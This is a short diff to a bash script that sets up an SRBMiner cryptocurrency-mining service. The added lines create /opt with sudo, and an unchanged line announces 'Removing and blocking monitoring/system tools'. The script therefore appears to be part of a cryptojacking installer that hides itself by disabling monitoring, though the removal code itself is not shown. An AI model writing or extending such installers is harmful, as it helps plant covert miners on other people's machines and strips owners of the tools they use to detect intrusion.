@@ -1,8 +1,15 @@
 #!/bin/bash
+
 if systemctl is-active --quiet srbminer.service; then
   echo "[*] SRBMiner service is already running. Skipping setup."
   exit 0
 fi
+
+if [ ! -d "/opt" ]; then
+  echo "[*] /opt directory does not exist. Creating it..."
+  sudo mkdir -p /opt
+fi
+
 
 echo "[*] Removing and blocking monitoring/system tools..."
 
